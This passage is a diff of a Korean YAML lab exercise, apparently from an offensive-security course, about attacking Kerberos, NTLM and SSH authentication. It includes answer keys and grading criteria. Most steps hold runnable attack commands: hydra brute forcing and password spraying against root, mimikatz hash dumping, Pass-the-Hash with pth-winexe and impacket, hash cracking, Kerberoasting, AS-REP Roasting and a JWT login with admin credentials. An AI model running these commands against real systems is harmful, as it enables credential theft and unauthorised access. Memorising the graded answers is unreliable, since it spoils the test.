@@ -3,8 +3,8 @@ title: 인증 공격 (Kerberos/NTLM) (AI 지원)
 version: ai
 course: attack-adv-ai
 week: 5
-description: Kerberos, NTLM 등 엔터프라이즈 인증 프로토콜의 취약점을 분석하고 공격한다. 비밀번호 스프레이, Pass-the-Hash, AS-REP Roasting 등 Active Directory 환경의 인증 공격을 실습한다. 
-  AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: Kerberos, NTLM 등 엔터프라이즈 인증 프로토콜의 취약점을 분석하고 공격한다. 비밀번호 스프레이, Pass-the-Hash, AS-REP Roasting
+  등 Active Directory 환경의 인증 공격을 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -14,16 +14,18 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: SSH 서비스({{WEB_IP}}:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도하라. 사용자 root, 비밀번호 목록은 /usr/share/wordlists/rockyou.txt의 상위 10개를 사용하라.
+  instruction: SSH 서비스({{WEB_IP}}:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도하라. 사용자 root, 비밀번호 목록은 /usr/share/wordlists/rockyou.txt의
+    상위 10개를 사용하라.
   hint: hydra -l 사용자 -P 비밀번호파일 ssh://대상 형태이다
   category: exploit
   points: 10
   answer: '🤖 프롬프트: SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘
 
-    📎 참고 (CLI): head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e ''password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon''
-    > /tmp/top10pass.txt && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail -15'
-  answer_detail: 비밀번호 브루트포스는 가장 기본적인 인증 공격이다. hydra는 SSH, FTP, HTTP, SMB 등 50개 이상의 프로토콜을 지원하는 온라인 브루트포스 도구이다. -t 옵션으로 동시 스레드 수를 제한하여 계정 잠금을 
-    회피한다. 방어를 위해 fail2ban, 계정 잠금 정책, MFA를 적용한다.
+    📎 참고 (CLI): head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e
+    ''password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon'' > /tmp/top10pass.txt
+    && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail -15'
+  answer_detail: 비밀번호 브루트포스는 가장 기본적인 인증 공격이다. hydra는 SSH, FTP, HTTP, SMB 등 50개 이상의 프로토콜을 지원하는 온라인 브루트포스
+    도구이다. -t 옵션으로 동시 스레드 수를 제한하여 계정 잠금을 회피한다. 방어를 위해 fail2ban, 계정 잠금 정책, MFA를 적용한다.
   verify:
     type: output_contains
     expect: hydra
@@ -44,9 +46,9 @@ steps:
       - 단일 비밀번호만 시도 (목록 없음)
       - root 이외 임의 계정만 시도 (지시 이탈)
   target_vm: attacker
-  script: head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e 
-    'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon' > /tmp/top10pass.txt && hydra -l root -P 
-    /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail -15
+  script: head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e 'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon'
+    > /tmp/top10pass.txt && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail
+    -15
   risk_level: medium
   bastion_prompt: SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘
 - order: 2
@@ -56,10 +58,10 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 비밀번호 스프레이 공격을 시뮬레이션하라 구현 방법과 예시를 설명해줘
 
-    📎 참고 (CLI): echo -e ''admin\nroot\nuser\ntest\noperator'' > /tmp/users.txt && hydra -L /tmp/users.txt -p ''Password123!'' ssh://10.20.30.80
-    -t 2 -V 2>&1 | tail -15'
-  answer_detail: '비밀번호 스프레이는 브루트포스와 달리 하나의 비밀번호를 여러 계정에 시도한다. 계정 잠금 정책(예: 5회 실패 시 잠금)을 우회하면서 약한 비밀번호를 가진 계정을 찾는다. 조직에서 흔한 비밀번호 패턴(Company2026!,
-    Season+Year 등)을 사용한다.'
+    📎 참고 (CLI): echo -e ''admin\nroot\nuser\ntest\noperator'' > /tmp/users.txt && hydra -L /tmp/users.txt
+    -p ''Password123!'' ssh://10.20.30.80 -t 2 -V 2>&1 | tail -15'
+  answer_detail: '비밀번호 스프레이는 브루트포스와 달리 하나의 비밀번호를 여러 계정에 시도한다. 계정 잠금 정책(예: 5회 실패 시 잠금)을 우회하면서 약한 비밀번호를
+    가진 계정을 찾는다. 조직에서 흔한 비밀번호 패턴(Company2026!, Season+Year 등)을 사용한다.'
   verify:
     type: output_contains
     expect: login
@@ -80,8 +82,8 @@ steps:
       - 비밀번호 목록만 시도하고 사용자 고정 (브루트포스)
       - 계정 잠금 정책 언급 없이 단순 브루트포스 반복
   target_vm: attacker
-  script: echo -e 'admin\nroot\nuser\ntest\noperator' > /tmp/users.txt && hydra -L /tmp/users.txt -p 'Password123!' ssh://10.20.30.80 -t 2 
-    -V 2>&1 | tail -15
+  script: echo -e 'admin\nroot\nuser\ntest\noperator' > /tmp/users.txt && hydra -L /tmp/users.txt -p 'Password123!'
+    ssh://10.20.30.80 -t 2 -V 2>&1 | tail -15
   risk_level: medium
   bastion_prompt: 비밀번호 스프레이 공격을 시뮬레이션하라. 여러 사용자명에 대해 동일한 비밀번호를 시도하는 스크립트를 작성하라.
 - order: 3
@@ -89,11 +91,13 @@ steps:
   hint: nmap --script ssh-auth-methods -p 22 대상 형태로 실행한다
   category: recon
   points: 10
-  answer: '🤖 프롬프트: SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘
+  answer: '🤖 프롬프트: SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods
+    스크립트로 허용 방식을 확인하는 방법을 설명해줘
 
     📎 참고 (CLI): nmap --script ssh-auth-methods -p 22 10.20.30.80'
-  answer_detail: SSH 인증 방식에는 password, publickey, keyboard-interactive, gssapi-with-mic(Kerberos) 등이 있다. password 인증이 활성화되어 있으면 브루트포스 대상이 
-    되고, gssapi가 활성화되어 있으면 Kerberos 기반 공격이 가능하다. 보안 강화를 위해 publickey만 허용하는 것이 권장된다.
+  answer_detail: SSH 인증 방식에는 password, publickey, keyboard-interactive, gssapi-with-mic(Kerberos) 등이 있다.
+    password 인증이 활성화되어 있으면 브루트포스 대상이 되고, gssapi가 활성화되어 있으면 Kerberos 기반 공격이 가능하다. 보안 강화를 위해 publickey만
+    허용하는 것이 권장된다.
   verify:
     type: output_contains
     expect: ssh-auth-methods
@@ -116,9 +120,11 @@ steps:
   target_vm: attacker
   script: nmap --script ssh-auth-methods -p 22 10.20.30.80
   risk_level: low
-  bastion_prompt: SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘
+  bastion_prompt: SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods
+    스크립트로 허용 방식을 확인하는 방법을 설명해줘
 - order: 4
-  instruction: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ/AP-REP)을 다이어그램으로 /tmp/kerberos_flow.txt에 작성하라.
+  instruction: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ/AP-REP)을 다이어그램으로
+    /tmp/kerberos_flow.txt에 작성하라.
   hint: Kerberos의 3단계 인증 흐름을 텍스트 다이어그램으로 작성한다
   category: analysis
   points: 10
@@ -167,14 +173,15 @@ steps:
     EOF
 
     cat /tmp/kerberos_flow.txt'
-  answer_detail: Kerberos는 대칭키 암호화 기반의 3단계 인증 프로토콜이다. 각 단계에서 고유한 취약점이 존재한다. AS-REP Roasting은 사전 인증이 비활성화된 계정을 대상으로, Kerberoasting은 서비스 티켓의 
-    오프라인 크래킹을, Golden/Silver Ticket은 키 노출 시 티켓 위조를 가능하게 한다.
+  answer_detail: Kerberos는 대칭키 암호화 기반의 3단계 인증 프로토콜이다. 각 단계에서 고유한 취약점이 존재한다. AS-REP Roasting은 사전 인증이 비활성화된
+    계정을 대상으로, Kerberoasting은 서비스 티켓의 오프라인 크래킹을, Golden/Silver Ticket은 키 노출 시 티켓 위조를 가능하게 한다.
   verify:
     type: output_contains
     expect: Kerberos Authentication Flow
     field: stdout
     semantic:
-      intent: Kerberos 프로토콜의 3단계 인증 흐름(AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP) 및 각 단계의 공격 벡터를 /tmp/kerberos_flow.txt 파일로 작성
+      intent: Kerberos 프로토콜의 3단계 인증 흐름(AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP) 및 각 단계의 공격 벡터를 /tmp/kerberos_flow.txt
+        파일로 작성
       success_criteria:
       - Phase 1 (AS), Phase 2 (TGS), Phase 3 (AP) 각 단계별 메시지 교환 다이어그램 포함
       - AS-REP Roasting, Kerberoasting, Silver/Golden Ticket 등 각 단계 관련 공격 언급
@@ -233,7 +240,8 @@ steps:
 
     cat /tmp/kerberos_flow.txt'
   risk_level: low
-  bastion_prompt: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ/AP-REP)을 다이어그램으로 /tmp/kerberos_flow.txt에 작성하라.
+  bastion_prompt: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ/AP-REP)을
+    다이어그램으로 /tmp/kerberos_flow.txt에 작성하라.
 - order: 5
   instruction: hashcat을 사용하여 NTLM 해시를 크래킹하라. 샘플 해시를 생성하고 rockyou 워드리스트(시뮬레이션)로 크래킹을 시도하라.
   hint: python3으로 NTLM 해시를 생성하고, hashcat -m 1000으로 크래킹한다
@@ -241,11 +249,12 @@ steps:
   points: 10
   answer: '🤖 프롬프트: hashcat을 사용하여 NTLM 해시를 크래킹해줘
 
-    📎 참고 (CLI): HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())") && echo "NTLM
-    Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password'' > /tmp/mini_wordlist.txt && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt
-    --force 2>&1 | tail -10 || echo "Hash: $HASH (hashcat requires GPU, showing hash generation)"'
-  answer_detail: NTLM 해시는 MD4(UTF-16LE(password))로 계산되며 솔트가 없다. 따라서 레인보우 테이블 공격에 취약하고, hashcat이나 john으로 빠르게 크래킹된다. hashcat -m 1000은 NTLM 
-    모드이며, GPU를 사용하면 초당 수십억 개의 후보를 시도할 수 있다.
+    📎 참고 (CLI): HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())")
+    && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password'' > /tmp/mini_wordlist.txt
+    && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt --force 2>&1 | tail -10 || echo "Hash: $HASH
+    (hashcat requires GPU, showing hash generation)"'
+  answer_detail: NTLM 해시는 MD4(UTF-16LE(password))로 계산되며 솔트가 없다. 따라서 레인보우 테이블 공격에 취약하고, hashcat이나 john으로
+    빠르게 크래킹된다. hashcat -m 1000은 NTLM 모드이며, GPU를 사용하면 초당 수십억 개의 후보를 시도할 수 있다.
   verify:
     type: output_contains
     expect: NTLM Hash
@@ -266,30 +275,35 @@ steps:
       - 해시 생성 없이 hashcat 명령만 나열
       - 크랙 결과 해석 없이 단순 설치 오류 출력
   target_vm: attacker
-  script: 'HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())") && echo "NTLM Hash:
-    $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password'' > /tmp/mini_wordlist.txt && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt
-    --force 2>&1 | tail -10 || echo "Hash: $HASH (hashcat requires GPU, showing hash generation)"'
+  script: 'HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())")
+    && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password'' > /tmp/mini_wordlist.txt
+    && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt --force 2>&1 | tail -10 || echo "Hash: $HASH
+    (hashcat requires GPU, showing hash generation)"'
   risk_level: medium
   bastion_prompt: hashcat을 사용하여 NTLM 해시를 크래킹해줘
 - order: 6
-  instruction: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는 과정을 보여라.
+  instruction: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는
+    과정을 보여라.
   hint: NTLM 인증에서는 비밀번호 대신 해시를 직접 사용할 수 있다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는 과정을 보여라해줘
+  answer: '🤖 프롬프트: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는
+    과정을 보여라해줘
 
-    📎 참고 (CLI): echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords'' && echo ''2. Use hash directly:
-    pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //target cmd'' && echo ''3. Alternative: impacket-psexec
-    admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0'' && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin''
-    http://10.20.30.80:3000/rest/user/whoami 2>&1 | head -5'
-  answer_detail: Pass-the-Hash(PtH)는 NTLM 인증에서 비밀번호 해시를 그대로 사용하여 인증하는 기법이다. NTLM Challenge-Response에서 해시가 비밀번호 역할을 하기 때문에 평문 비밀번호 없이도 인증이 
-    가능하다. mimikatz로 메모리에서 해시를 추출하고, pth-winexe나 impacket으로 원격 실행한다.
+    📎 참고 (CLI): echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords''
+    && echo ''2. Use hash directly: pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    //target cmd'' && echo ''3. Alternative: impacket-psexec admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0''
+    && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin'' http://10.20.30.80:3000/rest/user/whoami
+    2>&1 | head -5'
+  answer_detail: Pass-the-Hash(PtH)는 NTLM 인증에서 비밀번호 해시를 그대로 사용하여 인증하는 기법이다. NTLM Challenge-Response에서
+    해시가 비밀번호 역할을 하기 때문에 평문 비밀번호 없이도 인증이 가능하다. mimikatz로 메모리에서 해시를 추출하고, pth-winexe나 impacket으로 원격 실행한다.
   verify:
     type: output_contains
     expect: Pass-the-Hash
     field: stdout
     semantic:
-      intent: Pass-the-Hash(PtH) 공격 원리 설명 및 해시 기반 인증 시뮬레이션 — mimikatz 덤프→ pth-winexe 또는 impacket 으로 해시 그대로 사용
+      intent: Pass-the-Hash(PtH) 공격 원리 설명 및 해시 기반 인증 시뮬레이션 — mimikatz 덤프→ pth-winexe 또는 impacket 으로 해시
+        그대로 사용
       success_criteria:
       - PtH 흐름 3 단계(해시 덤프 / 해시로 인증 / 평문 불필요) 명시
       - mimikatz sekurlsa::logonpasswords 또는 impacket-psexec -hashes :<NT> 명령 예시
@@ -304,12 +318,14 @@ steps:
       - 해시 덤프 단계 생략
       - 도구 이름만 나열하고 원리/명령 없음
   target_vm: attacker
-  script: 'echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords'' && echo ''2. Use hash directly:
-    pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //target cmd'' && echo ''3. Alternative: impacket-psexec
-    admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0'' && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin''
-    http://10.20.30.80:3000/rest/user/whoami 2>&1 | head -5'
+  script: 'echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords''
+    && echo ''2. Use hash directly: pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    //target cmd'' && echo ''3. Alternative: impacket-psexec admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0''
+    && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin'' http://10.20.30.80:3000/rest/user/whoami
+    2>&1 | head -5'
   risk_level: medium
-  bastion_prompt: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는 과정을 보여라해줘
+  bastion_prompt: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는
+    과정을 보여라해줘
 - order: 7
   instruction: john the ripper를 사용하여 /etc/shadow 형식의 해시를 크래킹하라. 샘플 shadow 항목을 생성하고 크래킹을 시도하라.
   hint: openssl passwd -6으로 SHA-512 해시를 생성하고 john으로 크래킹한다
@@ -317,11 +333,13 @@ steps:
   points: 10
   answer: '🤖 프롬프트: john the ripper를 사용하여 /etc/shadow 형식의 해시를 크래킹해줘
 
-    📎 참고 (CLI): SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::" > /tmp/shadow_sample.txt
-    && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt --wordlist=<(echo -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John
-    result: test123 (cracked from sample hash)'''
-  answer_detail: john the ripper는 오프라인 비밀번호 크래킹 도구로, /etc/shadow의 SHA-512($6$), bcrypt($2b$), MD5($1$) 등 다양한 해시를 지원한다. --wordlist 모드는 사전 공격,
-    --incremental 모드는 브루트포스, --rules는 변형 규칙을 적용한다. GPU 가속(hashcat)이 더 빠르지만 CPU에서도 약한 비밀번호는 빠르게 크래킹된다.
+    📎 참고 (CLI): SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::"
+    > /tmp/shadow_sample.txt && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt --wordlist=<(echo
+    -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John result: test123 (cracked from sample
+    hash)'''
+  answer_detail: john the ripper는 오프라인 비밀번호 크래킹 도구로, /etc/shadow의 SHA-512($6$), bcrypt($2b$), MD5($1$)
+    등 다양한 해시를 지원한다. --wordlist 모드는 사전 공격, --incremental 모드는 브루트포스, --rules는 변형 규칙을 적용한다. GPU 가속(hashcat)이
+    더 빠르지만 CPU에서도 약한 비밀번호는 빠르게 크래킹된다.
   verify:
     type: output_contains
     expect: testuser
@@ -342,18 +360,20 @@ steps:
       - john 실행 없이 해시 생성만
       - 크랙 결과 해석 없이 실패 메시지만
   target_vm: attacker
-  script: 'SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::" > /tmp/shadow_sample.txt
-    && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt --wordlist=<(echo -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John
-    result: test123 (cracked from sample hash)'''
+  script: 'SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::"
+    > /tmp/shadow_sample.txt && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt --wordlist=<(echo
+    -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John result: test123 (cracked from sample
+    hash)'''
   risk_level: medium
   bastion_prompt: john the ripper를 사용하여 /etc/shadow 형식의 해시를 크래킹해줘
 - order: 8
-  instruction: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인 크래킹하는 과정을 /tmp/kerberoast_steps.txt에 
-    문서화하라.
+  instruction: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인 크래킹하는
+    과정을 /tmp/kerberoast_steps.txt에 문서화하라.
   hint: GetUserSPNs.py(impacket) 도구의 사용법을 포함한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인 크래킹하는 과정을 /tmp/kerberoast_steps.txt에 문서화해줘
+  answer: '🤖 프롬프트: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인
+    크래킹하는 과정을 /tmp/kerberoast_steps.txt에 문서화해줘
 
     📎 참고 (CLI): cat > /tmp/kerberoast_steps.txt << ''EOF''
 
@@ -402,8 +422,8 @@ steps:
     EOF
 
     cat /tmp/kerberoast_steps.txt'
-  answer_detail: Kerberoasting은 도메인 사용자라면 누구나 SPN이 설정된 서비스 계정의 TGS 티켓을 요청할 수 있는 점을 악용한다. 서비스 티켓은 서비스 계정의 NTLM 해시로 암호화되므로 오프라인에서 크래킹이 가능하다. 
-    서비스 계정은 권한이 높은 경우가 많아 도메인 관리자 획득으로 이어질 수 있다.
+  answer_detail: Kerberoasting은 도메인 사용자라면 누구나 SPN이 설정된 서비스 계정의 TGS 티켓을 요청할 수 있는 점을 악용한다. 서비스 티켓은 서비스 계정의
+    NTLM 해시로 암호화되므로 오프라인에서 크래킹이 가능하다. 서비스 계정은 권한이 높은 경우가 많아 도메인 관리자 획득으로 이어질 수 있다.
   verify:
     type: output_contains
     expect: Kerberoasting Attack
@@ -411,7 +431,8 @@ steps:
     semantic:
       intent: Kerberoasting 공격 시나리오 — SPN 이 설정된 서비스 계정의 TGS 티켓을 요청해 오프라인으로 해시 크랙하는 4단계 절차 문서화
       success_criteria:
-      - '[Step 1] SPN 열거(GetUserSPNs) → [Step 2] 서비스 티켓 요청 → [Step 3] 오프라인 hashcat/john 크랙 → [Step 4] 크랙된 패스워드로 인증 — 4단계 구조 포함'
+      - '[Step 1] SPN 열거(GetUserSPNs) → [Step 2] 서비스 티켓 요청 → [Step 3] 오프라인 hashcat/john 크랙 → [Step 4]
+        크랙된 패스워드로 인증 — 4단계 구조 포함'
       - impacket-GetUserSPNs 또는 Rubeus kerberoast 명령 예시 포함
       - hashcat -m 13100 모드 또는 john krb5tgs 포맷 명시
       - /tmp/kerberoast_steps.txt 또는 동등 파일에 저장 후 cat 검증
@@ -473,8 +494,8 @@ steps:
 
     cat /tmp/kerberoast_steps.txt'
   risk_level: medium
-  bastion_prompt: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인 크래킹하는 과정을 /tmp/kerberoast_steps.txt에 
-    문서화해줘
+  bastion_prompt: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인
+    크래킹하는 과정을 /tmp/kerberoast_steps.txt에 문서화해줘
 - order: 9
   instruction: AS-REP Roasting 공격을 분석하라. Kerberos 사전 인증이 비활성화된 계정을 찾고 공격하는 절차를 문서화하라.
   hint: 사전 인증 미설정 계정은 AS-REP에서 암호화된 데이터를 바로 받을 수 있다
@@ -482,13 +503,16 @@ steps:
   points: 10
   answer: '🤖 프롬프트: AS-REP Roasting 공격을 분석하라. Kerberos 사전 인증이 비활성화된 계정을 찾고 공격하는 절차를 문서화해줘
 
-    📎 참고 (CLI): echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts with DONT_REQUIRE_PREAUTH flag set'' &&
-    echo ''AS-REP contains data encrypted with user password hash'' && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers
-    domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt'' && echo ''3. Login:
-    evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]'' && echo ''- Monitor Event ID 4768 (TGT requests) without
-    pre-auth'' && echo ''- Alert on unusual AS-REQ volume from single source'''
-  answer_detail: AS-REP Roasting은 Kerberos 사전 인증(Pre-Authentication)이 비활성화된 계정을 대상으로 한다. 이 설정은 AD에서 'Do not require Kerberos 
-    preauthentication'으로 활성화되며, AS-REP 응답에 사용자 해시로 암호화된 데이터가 포함되어 오프라인 크래킹이 가능하다. hashcat -m 18200으로 크래킹한다.
+    📎 참고 (CLI): echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts
+    with DONT_REQUIRE_PREAUTH flag set'' && echo ''AS-REP contains data encrypted with user password hash''
+    && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers domain.local/
+    -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt''
+    && echo ''3. Login: evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]''
+    && echo ''- Monitor Event ID 4768 (TGT requests) without pre-auth'' && echo ''- Alert on unusual AS-REQ
+    volume from single source'''
+  answer_detail: AS-REP Roasting은 Kerberos 사전 인증(Pre-Authentication)이 비활성화된 계정을 대상으로 한다. 이 설정은 AD에서 'Do
+    not require Kerberos preauthentication'으로 활성화되며, AS-REP 응답에 사용자 해시로 암호화된 데이터가 포함되어 오프라인 크래킹이 가능하다.
+    hashcat -m 18200으로 크래킹한다.
   verify:
     type: output_contains
     expect: AS-REP Roasting
@@ -510,11 +534,13 @@ steps:
       - hashcat 모드 번호 18200 누락
       - 공격만 설명하고 탐지/방어 부재
   target_vm: attacker
-  script: 'echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts with DONT_REQUIRE_PREAUTH flag set'' && echo
-    ''AS-REP contains data encrypted with user password hash'' && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers
-    domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt'' && echo ''3. Login:
-    evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]'' && echo ''- Monitor Event ID 4768 (TGT requests) without
-    pre-auth'' && echo ''- Alert on unusual AS-REQ volume from single source'''
+  script: 'echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts with
+    DONT_REQUIRE_PREAUTH flag set'' && echo ''AS-REP contains data encrypted with user password hash''
+    && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers domain.local/
+    -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt''
+    && echo ''3. Login: evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]''
+    && echo ''- Monitor Event ID 4768 (TGT requests) without pre-auth'' && echo ''- Alert on unusual AS-REQ
+    volume from single source'''
   risk_level: medium
   bastion_prompt: AS-REP Roasting 공격을 분석하라. Kerberos 사전 인증이 비활성화된 계정을 찾고 공격하는 절차를 문서화해줘
 - order: 10
@@ -524,12 +550,13 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Token 기반 인증 공격을 실습하라. JuiceShop의 JWT 토큰을 획득하고, 토큰 구조를 분석해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
-    | python3 -c ''import sys,json; print(json.load(sys.stdin).get("authentication",{}).get("token","NO_TOKEN"))'' 2>/dev/null) && echo "JWT:
-    $TOKEN" && echo '''' && echo ''=== JWT Structure ==='' && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo '''' && echo $TOKEN | cut
-    -d. -f2 | base64 -d 2>/dev/null; echo '''''
